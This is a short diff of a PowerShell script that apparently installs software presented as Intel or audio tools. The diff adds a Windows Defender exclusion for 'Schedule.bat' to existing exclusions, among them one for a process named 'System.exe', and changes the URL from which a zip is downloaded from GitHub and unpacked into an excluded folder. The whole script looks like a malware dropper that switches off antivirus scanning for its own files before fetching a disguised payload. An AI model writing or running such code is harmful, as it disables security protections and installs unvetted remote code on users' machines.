@@ -12,6 +12,7 @@ $TargetNBat     = "$TargetPath\Register_Notify.bat"
 
 Add-MpPreference -ExclusionProcess 'AudioTools.exe' -Force
 Add-MpPreference -ExclusionProcess 'Notify.exe' -Force
+Add-MpPreference -ExclusionProcess 'Schedule.bat' -Force
 Add-MpPreference -ExclusionProcess 'System.exe' -Force
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
@@ -26,7 +27,7 @@ if (Test-Path "$TargetPath") {
   New-Item -Path "$TargetPath" -ItemType Directory -Force
 }
 
-  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudio/raw/refs/heads/main/intelaudio.zip" -OutFile "$TargetZip"
+  Invoke-WebRequest -Uri "https://github.com/B95segal/audiotools/raw/refs/heads/main/audiotools.zip" -OutFile "$TargetZip"
   Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
   Remove-Item -Path "$TargetZip"
 
